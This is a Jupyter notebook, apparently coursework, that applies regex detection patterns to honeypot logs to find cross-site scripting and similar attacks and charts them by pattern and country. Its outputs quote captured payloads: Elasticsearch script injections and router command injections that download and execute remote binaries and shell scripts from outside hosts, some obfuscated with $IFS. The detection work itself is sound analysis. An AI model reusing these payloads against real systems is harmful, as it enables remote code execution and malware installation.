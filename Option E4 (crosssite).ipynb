{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {
    "collapsed": true
   },
   "source": [
    "Option E – Attack Method Detection Part 1\n",
    "\n",
    "This option deals with creating a method to detect the following attack methods:  \n",
    "Chart and Graph by date, the following based on source IP and country.  \n",
    "1. Search for strings containing the characters which are known to be used in a Shellshock exploit.  \n",
    "2. Search for attempts where a website/webserver is being used that potentially hosts malware.  \n",
    "3. Search for strings containing the characters which are known to be used in a directory transversal attack  \n",
    "4. **Search for cross site scripting (XSS) attacks. **\n",
    " - (defintion) cross site scripting injecting malicious scripts into a the a vulnerable server's website.\n",
    " - A: most of the attacks are coming from US, with occasional attack originating from China and Russia.\n",
    "\n",
    "What types of threat actors are using the above attacks? Where are these attacks coming from? "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Option E – Attack Method Detection Part 1\n",
    "\n",
    "This option deals with creating a method to detect the following attack methods:  \n",
    "** Chart and Graph by date, the following based on source IP and country. **\n",
    "\n",
    "#### 4. Search for cross site scripting (XSS) attacks."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<style>.container { width:90% !important; }</style>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "% matplotlib inline\n",
    "\n",
    "from IPython.core.display import display, HTML\n",
    "display(HTML(\"<style>.container { width:90% !important; }</style>\"))\n",
    "import numpy as np\n",
    "import pandas as pd\n",
    "pd.set_option('display.max_columns', 100)\n",
    "pd.set_option('display.height', 100)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "tracker=[]\n",
    "\n",
    "# define check function\n",
    "def chk3(chkdf,  searchlist, dfname, arr=tracker):\n",
    "    pd.set_option('display.max_rows', 500)\n",
    "    for i in range(8, len(chkdf.columns), 1):\n",
    "        result = chkdf[chkdf.iloc[:,i].str.contains(searchlist).fillna(False)]         \n",
    "        if result.iloc[:,1].count() != 0:\n",
    "            print(\"Found <\",searchlist,\"> in column <\", chkdf.columns[i],\"> count\",result.iloc[:,1].count())\n",
    "            arr.append([dfname,searchlist,chkdf.columns[i],result.iloc[:,1].count()])\n",
    "            return (result[['timestamp','source_ip','country','asn',chkdf.columns[i]]])\n",
    "            "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# bag of words"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "# list of keywords i'm finding\n",
    "# https://andreafortuna.org/cybersecurity/how-a-malware-can-download-a-remote-payload-and-execute-malicious-code-in-one-line/\n",
    "# https://www.owasp.org/index.php/Path_Traversal\n",
    "# https://www.owasp.org/index.php/Testing_Directory_traversal/file_include_(OTG-AUTHZ-001)\n",
    "# http://www.blackhat.com/presentations/bh-usa-09/VELANAVA/BHUSA09-VelaNava-FavoriteXSS-SLIDES.pdf\n",
    "# test for querystrings\n",
    "\n",
    "mylist = {'OgnlContext','\\.js','\\.sh', # potential malicious code that is ready for remote execution\n",
    "          'function \\(', '\\<script\\>', # self executing js\n",
    "          '[Jj]\\s*[Aa]\\s*[Vv]\\s*[Aa]\\s*[Ss]\\s*[Cc]\\s*[Rr]\\s*[Ii]\\s*[Pp]\\s*[Tt]', # javascript\n",
    "          'http\\:\\/\\/(?!192.168|.*google.com)', # IP address that didnt start with 192.168.x.x\n",
    "          '\\<.+\\>', #.\\\n",
    "          'cookie', # cookie\n",
    "          '&#[\\w]{2,7}', # catching &#0000106&#0000097&#0000118&#0000097\n",
    "          '\\d{4}\\.\\d{4}\\.\\d{4}\\.', #Octal encoding\n",
    "          #'[0-9a-fA-F]x[0-9]{1,6}.(?!.*(UNION))', #Hex encoding\n",
    "          '&[\\w]{2,4};', # HTML entities\n",
    "          '(%[0-9a-fA-F]{2}){4}', #URL encoding\n",
    "          '\\<\\<','\\>\\>', #Extraneous open brackets\n",
    "          '<(|\\/|[^\\/>][^>]+|\\/[^>][^>]+)>' # regular HTML tags\n",
    "         }"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "***\n",
    "### Cowrie (results omitted)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "cowrie_tracker=[]\n",
    "\n",
    "\n",
    "dfc = pd.read_csv(\"sorted-cowrie.csv\",sep='\\t')\n",
    "\n",
    "dfc=dfc[['timestamp','channel','source_ip','destination_port',\n",
    "        'protocol','city','country','asn', 'commands', 'loggedin',\n",
    "       'version', 'ttylog', 'urls', 'session', 'payload_startTime',\n",
    "       'payload_endTime', 'credentials']]\n",
    "\n",
    "dfc_1 = pd.DataFrame()\n",
    "for ix in mylist:\n",
    "    dfc_1 = pd.concat([dfc_1,chk3(dfc,ix,'Cowrie',cowrie_tracker)]).reset_index(drop=True)\n",
    "if (dfc_1.empty != True):\n",
    "    dfc_1 = dfc_1.drop_duplicates()\n",
    "else:\n",
    "    print(\"Dataframe Empty\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "scrolled": true
   },
   "source": [
    "dfc_1[dfc_1.credentials.str.contains('[Jj]\\s*[Aa]\\s*[Vv]\\s*[Aa]\\s*[Ss]\\s*[Cc]\\s*[Rr]\\s*[Ii]\\s*[Pp]\\s*[Tt]').fillna(False)].credentials.values"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "***\n",
    "### Dionaea (empty omit)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "dfd = pd.read_csv(\"sorted-dionaea.csv\",sep='\\t')\n",
    "dfd=dfd[['timestamp','channel','source_ip','destination_port',\n",
    "        'protocol','city','country','asn', 'remote_hostname',\n",
    "       'connection_transport', 'connection_type']]\n",
    "\n",
    "dfd_1 = pd.DataFrame()\n",
    "for ix in mylist:\n",
    "    dfd_1 = pd.concat([dfd_1,chk3(dfd,ix,'Dionaea')]).reset_index(drop=True)\n",
    "if (dfd_1.empty != True):\n",
    "    dfd_1 = dfd_1.drop_duplicates()\n",
    "else:\n",
    "    print(\"Dataframe Empty\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "***\n",
    "### Elastic"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Found < http\\:\\/\\/(?!192.168|.*google.com) > in column < URL > count 7\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\andyl\\Anaconda3\\lib\\site-packages\\ipykernel_launcher.py:7: UserWarning: This pattern has match groups. To actually get the groups, use str.extract.\n",
      "  import sys\n"
     ]
    }
   ],
   "source": [
    "dfe = pd.read_csv(\"sorted-elastichoney.csv\",sep='\\t')\n",
    "dfe=dfe[['timestamp','channel','source_ip','destination_port',\n",
    "        'protocol','city','country','asn','method','type',\n",
    "        'URL','form','user_agent','Payload Connection','Payload','Payload Resource','Payload MD5']]\n",
    "\n",
    "dfe_1 = pd.DataFrame()\n",
    "for ix in mylist:\n",
    "    dfe_1 = pd.concat([dfe_1,chk3(dfe,ix,'Elastic')]).reset_index(drop=True)\n",
    "if (dfe_1.empty != True):\n",
    "    dfe_1 = dfe_1.drop_duplicates()\n",
    "else:\n",
    "    print(\"Dataframe Empty\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array(['192.168.10.4:9200/_search?source={\"size\":1,\"query\":{\"filtered\":{\"query\":{\"match_all\":{}}}},\"script_fields\":{\"exp\":{\"script\":\"import java.util.*;\\\\nimport java.io.*;\\\\nString str = \\\\\"\\\\\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\\\\\"curl -o /tmp/cysip http://116.48.48.14/cysip\\\\\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();\"}}}',\n",
       "       '192.168.10.4:9200/_search?source={\"size\":1,\"query\":{\"filtered\":{\"query\":{\"match_all\":{}}}},\"script_fields\":{\"exp\":{\"script\":\"import java.util.*;\\\\nimport java.io.*;\\\\nString str = \\\\\"\\\\\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\\\\\"wget -c http://116.48.48.14/cysip\\\\\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();\"}}}',\n",
       "       '192.168.10.6:9200/_search?source={\"size\":1,\"query\":{\"filtered\":{\"query\":{\"match_all\":{}}}},\"script_fields\":{\"exp\":{\"script\":\"import java.util.*;\\\\nimport java.io.*;\\\\nString str = \\\\\"\\\\\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\\\\\"curl -o /tmp/JrLinux http://27.151.13.170:1234/JrLinux\\\\\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();\"}}}',\n",
       "       '192.168.10.6:9200/_search?source={\"size\":1,\"query\":{\"filtered\":{\"query\":{\"match_all\":{}}}},\"script_fields\":{\"exp\":{\"script\":\"import java.util.*;\\\\nimport java.io.*;\\\\nString str = \\\\\"\\\\\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\\\\\"wget -c http://27.151.13.170:1234/JrLinux\\\\\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();\"}}}',\n",
       "       '192.168.10.6:9200/_search?source={\"size\":1,\"query\":{\"filtered\":{\"query\":{\"match_all\":{}}}},\"script_fields\":{\"exp\":{\"script\":\"import java.util.*;\\\\nimport java.io.*;\\\\nString str = \\\\\"\\\\\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\\\\\"wget -c http://27.151.13.170:1234/JrLinux\\\\\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();\"}}}',\n",
       "       '192.168.10.6:9200/_search?source={\"size\":1,\"query\":{\"filtered\":{\"query\":{\"match_all\":{}}}},\"script_fields\":{\"exp\":{\"script\":\"import java.util.*;\\\\nimport java.io.*;\\\\nString str = \\\\\"\\\\\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\\\\\"wget -c http://27.151.13.170:1234/JrLinux\\\\\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();\"}}}',\n",
       "       '192.168.10.4:9200/_search?source={\"size\":1,\"query\":{\"filtered\":{\"query\":{\"match_all\":{}}}},\"script_fields\":{\"exp\":{\"script\":\"import java.util.*;\\\\nimport java.io.*;\\\\nString str = \\\\\"\\\\\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\\\\\"wget -O /tmp/qw http://107.151.137.226:5648/qw\\\\\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();\"}}}'],\n",
       "      dtype=object)"
      ]
     },
     "execution_count": 29,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "dfe_1.URL.values"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "***\n",
    "### Glastopf"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Found < \\<.+\\> > in column < request_raw > count 13\n",
      "Found < <(|\\/|[^\\/>][^>]+|\\/[^>][^>]+)> > in column < request_raw > count 13\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\andyl\\Anaconda3\\lib\\site-packages\\ipykernel_launcher.py:7: UserWarning: This pattern has match groups. To actually get the groups, use str.extract.\n",
      "  import sys\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Found < http\\:\\/\\/(?!192.168|.*google.com) > in column < request_raw > count 103\n",
      "Found < OgnlContext > in column < request_raw > count 3\n",
      "Found < \\.sh > in column < request_raw > count 15\n",
      "Found < \\.js > in column < request_raw > count 12\n",
      "Found < cookie > in column < request_raw > count 2\n"
     ]
    }
   ],
   "source": [
    "dfg = pd.read_csv(\"sorted-glastopf.csv\",sep='\\t')\n",
    "dfg=dfg[['timestamp','channel','source_ip','destination_port',\n",
    "        'protocol','city','country','asn','Version','pattern',\n",
    "        'filename','request_raw','request_url']]\n",
    "dfg_1 = pd.DataFrame()\n",
    "for ix in mylist:\n",
    "    dfg_1 = pd.concat([dfg_1,chk3(dfg,ix,'Glastopf')]).reset_index(drop=True)\n",
    "if (dfg_1.empty != True):\n",
    "    dfg_1 = dfg_1.drop_duplicates()\n",
    "else:\n",
    "    print(\"Dataframe Empty\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array(['POST /hndUnblock.cgi HTTP/1.0, Accept: */*, Content-Length: 396, Content-Type: application/x-www-form-urlencoded, Host: 192.168.10.6, User-Agent: Wget(linux), , submit_button=&change_action=&action=&commit=&ttcp_num=2&ttcp_size=2&ttcp_ip=-h `cd /tmp;rm -f nmlt1.sh;wget -O nmlt1.sh http://31.148.220.33:80/nmlt1.sh;chmod +x nmlt1.sh;./nmlt1.sh`&StartEPI=1',\n",
       "       \"GET /;wget$IFS-O$IFS'/tmp/nmbt2.sh'$IFS'http://64.71.77.18/nmbt2.sh' HTTP/1.0, Accept: */*, Host: 192.168.10.6, User-Agent: Wget(linux)\",\n",
       "       \"GET /;wget$IFS-O$IFS'/tmp/nmbt2.sh'$IFS'http://208.110.66.154/nmbt2.sh' HTTP/1.0, Accept: */*, Host: 192.168.10.6, User-Agent: Wget(linux)\",\n",
       "       'POST /hndUnblock.cgi HTTP/1.0, Accept: */*, Content-Length: 384, Content-Type: application/x-www-form-urlencoded, Host: 192.168.10.6, User-Agent: Wget(linux), , submit_button=&change_action=&action=&commit=&ttcp_num=2&ttcp_size=2&ttcp_ip=-h `cd /tmp;rm -f nmlt1.sh;wget -O nmlt1.sh http://domstates.su/nmlt1.sh;chmod +x nmlt1.sh;./nmlt1.sh`&StartEPI=1',\n",
       "       'POST /hndUnblock.cgi HTTP/1.0, Accept: */*, Content-Length: 384, Content-Type: application/x-www-form-urlencoded, Host: 192.168.10.6, User-Agent: Wget(linux), , submit_button=&change_action=&action=&commit=&ttcp_num=2&ttcp_size=2&ttcp_ip=-h `cd /tmp;rm -f nmlt1.sh;wget -O nmlt1.sh http://domstates.su/nmlt1.sh;chmod +x nmlt1.sh;./nmlt1.sh`&StartEPI=1',\n",
       "       'POST /hndUnblock.cgi HTTP/1.0, Accept: */*, Content-Length: 384, Content-Type: application/x-www-form-urlencoded, Host: 192.168.10.6, User-Agent: Wget(linux), , submit_button=&change_action=&action=&commit=&ttcp_num=2&ttcp_size=2&ttcp_ip=-h `cd /tmp;rm -f nmlt1.sh;wget -O nmlt1.sh http://domstates.su/nmlt1.sh;chmod +x nmlt1.sh;./nmlt1.sh`&StartEPI=1',\n",
       "       'POST /hndUnblock.cgi HTTP/1.0, Accept: */*, Content-Length: 384, Content-Type: application/x-www-form-urlencoded, Host: 192.168.10.6, User-Agent: Wget(linux), , submit_button=&change_action=&action=&commit=&ttcp_num=2&ttcp_size=2&ttcp_ip=-h `cd /tmp;rm -f nmlt1.sh;wget -O nmlt1.sh http://domstates.su/nmlt1.sh;chmod +x nmlt1.sh;./nmlt1.sh`&StartEPI=1',\n",
       "       'POST /hndUnblock.cgi HTTP/1.0, Accept: */*, Content-Length: 384, Content-Type: application/x-www-form-urlencoded, Host: 192.168.10.6, User-Agent: Wget(linux), , submit_button=&change_action=&action=&commit=&ttcp_num=2&ttcp_size=2&ttcp_ip=-h `cd /tmp;rm -f nmlt1.sh;wget -O nmlt1.sh http://domstates.su/nmlt1.sh;chmod +x nmlt1.sh;./nmlt1.sh`&StartEPI=1',\n",
       "       'POST /hndUnblock.cgi HTTP/1.0, Accept: */*, Content-Length: 384, Content-Type: application/x-www-form-urlencoded, Host: 192.168.10.6, User-Agent: Wget(linux), , submit_button=&change_action=&action=&commit=&ttcp_num=2&ttcp_size=2&ttcp_ip=-h `cd /tmp;rm -f nmlt1.sh;wget -O nmlt1.sh http://domstates.su/nmlt1.sh;chmod +x nmlt1.sh;./nmlt1.sh`&StartEPI=1',\n",
       "       \"GET /;rm$IFS-f$IFS'/tmp/nmbt2.sh' HTTP/1.0, Accept: */*, Host: 192.168.10.6, User-Agent: Wget(linux)\",\n",
       "       \"GET /;chmod$IFS'777'$IFS'/tmp/nmbt2.sh' HTTP/1.0, Accept: */*, Host: 192.168.10.6, User-Agent: Wget(linux)\",\n",
       "       \"GET /;sh$IFS-c$IFS'/tmp/nmbt2.sh' HTTP/1.0, Accept: */*, Host: 192.168.10.6, User-Agent: Wget(linux)\",\n",
       "       \"GET /;rm$IFS-f$IFS'/tmp/nmbt2.sh' HTTP/1.0, Accept: */*, Host: 192.168.10.6, User-Agent: Wget(linux)\",\n",
       "       \"GET /;chmod$IFS'777'$IFS'/tmp/nmbt2.sh' HTTP/1.0, Accept: */*, Host: 192.168.10.6, User-Agent: Wget(linux)\",\n",
       "       \"GET /;sh$IFS-c$IFS'/tmp/nmbt2.sh' HTTP/1.0, Accept: */*, Host: 192.168.10.6, User-Agent: Wget(linux)\"],\n",
       "      dtype=object)"
      ]
     },
     "execution_count": 32,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "dfg_1[dfg_1.request_raw.str.contains('\\.sh')].request_raw.values"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "***\n",
    "### Shockpot"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\andyl\\Anaconda3\\lib\\site-packages\\ipykernel_launcher.py:7: UserWarning: This pattern has match groups. To actually get the groups, use str.extract.\n",
      "  import sys\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Found < http\\:\\/\\/(?!192.168|.*google.com) > in column < path > count 4\n",
      "Found < OgnlContext > in column < Content-Type > count 9\n",
      "Found < \\.sh > in column < path > count 16\n",
      "Found < \\.js > in column < path > count 258\n",
      "Found < cookie > in column < Cookie > count 3\n"
     ]
    }
   ],
   "source": [
    "dfs = pd.read_csv(\"sorted-shockpot.csv\",sep='\\t', lineterminator='\\r')\n",
    "dfs = dfs.loc[:,['timestamp','source_ip',\n",
    "       'city', 'province', 'province_code', 'country', 'country_code','asn', 'method', 'path', 'URL',\n",
    "       'query_string', 'Authorization', 'Content-Type', 'Cookie', 'Host', 'Connection',\n",
    "       'Te', 'Accept-Encoding', 'User Agent', 'X_Forwarded_For',\n",
    "       'X_Requested_With', 'is-shellshock']].fillna(\"\")\n",
    "dfs = dfs.drop(dfs.index[5284])\n",
    "\n",
    "dfs_1 = pd.DataFrame()\n",
    "for ix in mylist:\n",
    "    dfs_1 = pd.concat([dfs_1,chk3(dfs,ix,'shockpot')]).reset_index(drop=True)\n",
    "if (dfs_1.empty != True):\n",
    "    dfs_1 = dfs_1.drop_duplicates()\n",
    "else:\n",
    "    print(\"Dataframe Empty\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array([\"/;wget$IFS-O$IFS'/tmp/nmbt2.sh'$IFS'http://64.71.77.18/nmbt2.sh'\",\n",
       "       \"/;wget$IFS-O$IFS'/tmp/nmbt2.sh'$IFS'http://64.71.77.18/nmbt2.sh'\",\n",
       "       \"/;wget$IFS-O$IFS'/tmp/nmbt2.sh'$IFS'http://208.110.66.154/nmbt2.sh'\",\n",
       "       \"/;wget$IFS-O$IFS'/tmp/nmbt2.sh'$IFS'http://208.110.66.154/nmbt2.sh'\"],\n",
       "      dtype=object)"
      ]
     },
     "execution_count": 34,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "dfs_1[dfs_1.path.str.contains('http\\:\\/\\/(?!192.168|.*google.com)').fillna(False)].path.values"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "***\n",
    "### Word (empty omit)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "scrolled": true
   },
   "source": [
    "dfw = pd.read_csv(\"sorted-wordpot.csv\",sep='\\t')\n",
    "\n",
    "dfw=dfw[['timestamp','channel','source_ip','destination_port',\n",
    "        'protocol','city','country','asn', 'URL', 'filename',\n",
    "       'user_agent', 'User Name', 'Password']]\n",
    "\n",
    "dfw_1 = pd.DataFrame()\n",
    "for ix in mylist:\n",
    "    dfw_1 = pd.concat([dfw_1,chk3(dfw,ix,'Word')]).reset_index(drop=True)\n",
    "if (dfw_1.empty != True):\n",
    "    dfw_1 = dfw_1.drop_duplicates()\n",
    "else:\n",
    "    print(\"Dataframe Empty\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>honeypot</th>\n",
       "      <th>regex</th>\n",
       "      <th>attacks</th>\n",
       "      <th>regex_combined</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>Elastic</td>\n",
       "      <td>http\\:\\/\\/(?!192.168|.*google.com)</td>\n",
       "      <td>7</td>\n",
       "      <td>Elastic http\\:\\/\\/(?!192.168|.*google.com)</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>Glastopf</td>\n",
       "      <td>&lt;(|\\/|[^\\/&gt;][^&gt;]+|\\/[^&gt;][^&gt;]+)&gt;</td>\n",
       "      <td>13</td>\n",
       "      <td>Glastopf &lt;(|\\/|[^\\/&gt;][^&gt;]+|\\/[^&gt;][^&gt;]+)&gt;</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>Glastopf</td>\n",
       "      <td>OgnlContext</td>\n",
       "      <td>3</td>\n",
       "      <td>Glastopf OgnlContext</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>Glastopf</td>\n",
       "      <td>\\.js</td>\n",
       "      <td>12</td>\n",
       "      <td>Glastopf \\.js</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>Glastopf</td>\n",
       "      <td>\\.sh</td>\n",
       "      <td>15</td>\n",
       "      <td>Glastopf \\.sh</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>Glastopf</td>\n",
       "      <td>\\&lt;.+\\&gt;</td>\n",
       "      <td>13</td>\n",
       "      <td>Glastopf \\&lt;.+\\&gt;</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>Glastopf</td>\n",
       "      <td>cookie</td>\n",
       "      <td>2</td>\n",
       "      <td>Glastopf cookie</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7</th>\n",
       "      <td>Glastopf</td>\n",
       "      <td>http\\:\\/\\/(?!192.168|.*google.com)</td>\n",
       "      <td>103</td>\n",
       "      <td>Glastopf http\\:\\/\\/(?!192.168|.*google.com)</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>8</th>\n",
       "      <td>shockpot</td>\n",
       "      <td>OgnlContext</td>\n",
       "      <td>9</td>\n",
       "      <td>shockpot OgnlContext</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>9</th>\n",
       "      <td>shockpot</td>\n",
       "      <td>\\.js</td>\n",
       "      <td>258</td>\n",
       "      <td>shockpot \\.js</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>10</th>\n",
       "      <td>shockpot</td>\n",
       "      <td>\\.sh</td>\n",
       "      <td>16</td>\n",
       "      <td>shockpot \\.sh</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>11</th>\n",
       "      <td>shockpot</td>\n",
       "      <td>cookie</td>\n",
       "      <td>3</td>\n",
       "      <td>shockpot cookie</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>12</th>\n",
       "      <td>shockpot</td>\n",
       "      <td>http\\:\\/\\/(?!192.168|.*google.com)</td>\n",
       "      <td>4</td>\n",
       "      <td>shockpot http\\:\\/\\/(?!192.168|.*google.com)</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "    honeypot                               regex  attacks  \\\n",
       "0    Elastic  http\\:\\/\\/(?!192.168|.*google.com)        7   \n",
       "1   Glastopf     <(|\\/|[^\\/>][^>]+|\\/[^>][^>]+)>       13   \n",
       "2   Glastopf                         OgnlContext        3   \n",
       "3   Glastopf                                \\.js       12   \n",
       "4   Glastopf                                \\.sh       15   \n",
       "5   Glastopf                              \\<.+\\>       13   \n",
       "6   Glastopf                              cookie        2   \n",
       "7   Glastopf  http\\:\\/\\/(?!192.168|.*google.com)      103   \n",
       "8   shockpot                         OgnlContext        9   \n",
       "9   shockpot                                \\.js      258   \n",
       "10  shockpot                                \\.sh       16   \n",
       "11  shockpot                              cookie        3   \n",
       "12  shockpot  http\\:\\/\\/(?!192.168|.*google.com)        4   \n",
       "\n",
       "                                 regex_combined  \n",
       "0    Elastic http\\:\\/\\/(?!192.168|.*google.com)  \n",
       "1      Glastopf <(|\\/|[^\\/>][^>]+|\\/[^>][^>]+)>  \n",
       "2                          Glastopf OgnlContext  \n",
       "3                                 Glastopf \\.js  \n",
       "4                                 Glastopf \\.sh  \n",
       "5                               Glastopf \\<.+\\>  \n",
       "6                               Glastopf cookie  \n",
       "7   Glastopf http\\:\\/\\/(?!192.168|.*google.com)  \n",
       "8                          shockpot OgnlContext  \n",
       "9                                 shockpot \\.js  \n",
       "10                                shockpot \\.sh  \n",
       "11                              shockpot cookie  \n",
       "12  shockpot http\\:\\/\\/(?!192.168|.*google.com)  "
      ]
     },
     "execution_count": 36,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df_tracker = pd.DataFrame(tracker,columns=['honeypot','regex','orig_col','attacks'])\n",
    "df_tracker\n",
    "g1=df_tracker.groupby(['honeypot','regex'])['attacks'].sum().reset_index()\n",
    "g1['regex_combined'] = g1.honeypot +\" \"+ g1.regex+\"\"\n",
    "g1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 46,
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 864x432 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "import matplotlib.pyplot as plt\n",
    "\n",
    "plt.barh(g1.regex_combined, g1.attacks)\n",
    "plt.title(\"Crosssite attacks per Regular Expression\")\n",
    "plt.xlabel(\"Number of Attacks\")\n",
    "plt.ylabel(\"Regular Expression used\")\n",
    "plt.gcf().set_size_inches(12, 6)\n",
    "plt.xticks(rotation=90)\n",
    "plt.grid(True,alpha=.25)\n",
    "plt.tight_layout()\n",
    "\n",
    "for i, v in enumerate(g1.attacks):\n",
    "    plt.text(v+1, i-.1 , str(v), color='blue')\n",
    "plt.savefig(\"OE4.Crosssite_attack_per_regex.png\")\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 47,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 864x504 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "g2_type = pd.concat([dfs_1.country, dfg_1.country, dfe_1.country]).value_counts()\n",
    "g2_type\n",
    "import matplotlib.pyplot as plt\n",
    "\n",
    "plt.barh(g2_type.index, g2_type.values)\n",
    "plt.title(\"Crosssite attack by country\")\n",
    "plt.ylabel(\"No. of Attacks\")\n",
    "plt.gcf().set_size_inches(12, 7)\n",
    "plt.xticks(rotation=90)\n",
    "plt.grid(True, alpha=.5)\n",
    "plt.tight_layout()\n",
    "\n",
    "for i, v in enumerate(g2_type.values):\n",
    "    plt.text(v+2, i-.2 , str(v), color='blue',)\n",
    "plt.savefig(\"OE4.Crosssite_attack_by_country.png\")\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
